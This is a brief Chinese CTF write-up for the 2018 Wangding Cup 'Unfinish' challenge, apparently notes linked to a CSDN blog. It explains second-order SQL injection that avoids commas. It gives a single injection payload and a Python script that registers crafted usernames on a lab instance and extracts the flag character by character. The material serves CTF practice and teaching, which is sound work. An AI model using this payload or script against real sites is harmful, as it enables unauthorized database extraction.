# WP
[[网鼎杯2018]Unfinish_[网鼎杯2018]unfinish 1_fmyyy1的博客-CSDN博客](https://blog.csdn.net/fmyyy1/article/details/115733073)
# 知识点
过滤逗号的sql注入
```python
substr((database())from({})for(1))
=>
substr((database()),{},1)
```
```python
username=0'+ascii(substr(database() from 1 for 1))+'0
```
```python
import requests
import logging
import re
from time import sleep

# LOG_FORMAT = "%(lineno)d - %(asctime)s - %(levelname)s - %(message)s"
# logging.basicConfig(level=logging.DEBUG, format=LOG_FORMAT)

def search():
    flag = ''
    url = 'http://b52b0533-2f84-4c9b-bd73-e912ab23a59f.node3.buuoj.cn/'
    url1 = url+'register.php'
    url2 = url+'login.php'
    for i in range(100):
        sleep(0.3)#不加sleep就429了QAQ
        data1 = {"email" : "1234{}@123.com".format(i), "username" : "0'+ascii(substr((select * from flag) from {} for 1))+'0;".format(i), "password" : "123"}
        data2 = {"email" : "1234{}@123.com".format(i), "password" : "123"}
        r1 = requests.post(url1, data=data1)
        r2 = requests.post(url2, data=data2)
        res = re.search(r'<span class="user-name">\s+(\d+)\s+</span>',r2.text)
        res1 = re.search(r'\d+', res.group())
        flag = flag+chr(int(res1.group()))
        print(flag)
    print("final:"+flag)

if __name__ == '__main__':
    search()

```
